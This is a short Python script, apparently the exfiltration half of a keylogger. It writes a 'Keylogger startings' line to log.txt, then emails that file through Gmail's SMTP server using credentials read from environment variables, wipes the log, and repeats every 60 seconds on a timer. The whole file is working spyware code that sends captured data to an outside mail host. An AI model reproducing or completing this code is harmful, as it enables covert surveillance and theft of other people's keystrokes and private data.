import smtplib
import ssl
import email
import email.message
from email.message import EmailMessage
import os
import threading

with open("log.txt", "a") as f:
            f.write("Keylogger startings")
            

def send_email():
        
    email_adress = os.environ.get("EMAIL")
    app_password = os.environ.get("APP_PASSWORD")

    subject = "Log File"
    body = "Log File"
    sender_email = email_adress
    receiver_email = email_adress
    password = app_password
    
    em = EmailMessage()
    em["Subject"] = subject
    em["From"] = sender_email
    em["To"] = receiver_email
    em.set_content(body)
    em.add_attachment(open("log.txt", "rb").read(), maintype="text", subtype="plain", filename="log.txt")

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.send_message(em)
        server.quit()
        
    try:
        open('log.txt', 'w').close()
    except:
        pass
    
    threading.Timer(60, send_email).start()

send_email()
    

    

